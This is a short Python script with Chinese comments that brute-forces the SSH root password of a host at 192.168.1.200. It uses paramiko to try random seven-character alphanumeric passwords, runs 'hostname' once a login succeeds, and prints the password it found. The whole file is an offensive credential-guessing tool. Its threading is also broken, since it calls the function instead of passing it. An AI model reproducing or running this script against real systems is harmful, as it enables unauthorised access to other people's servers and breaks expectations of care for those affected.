# -*- coding:utf-8 -*-

import paramiko
from random import choice
import string
import time
import threading

#创建一个登陆日志，记录登陆信息
paramiko.util.log_to_file('paramiko.log')
client = paramiko.SSHClient()
#允许连接不在know-hosts文件中的主机
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

def ssh(client ,user, passwd):
    client.connect('192.168.1.200', 22, username=user, password=passwd, timeout=1)
    return client

#python3中为string.ascii_letters,而python2下则可以使用string.letters和string.ascii_letters
#生成随机密码，length为密码长度，包含数字，字母
def GenPassword(length=8,chars=string.ascii_letters+string.digits):
    return ''.join([choice(chars) for i in range(length)])


def passwd(client):
    while True:
        time.sleep(1)
        ps = GenPassword(7)
        #ps = 'magicud'
        try:
            if ssh(client , 'root', ps):
                stdin, stdout, stderr = client.exec_command('hostname')
                # 输出命令返回的结果
                #print stdout.readlines()
                print ps
                client.close()
                exit(0)
        except Exception,e:
            print e

if __name__=="__main__":
    for i in range(10):
        t = threading.Thread(target=passwd(client))
        t.start()


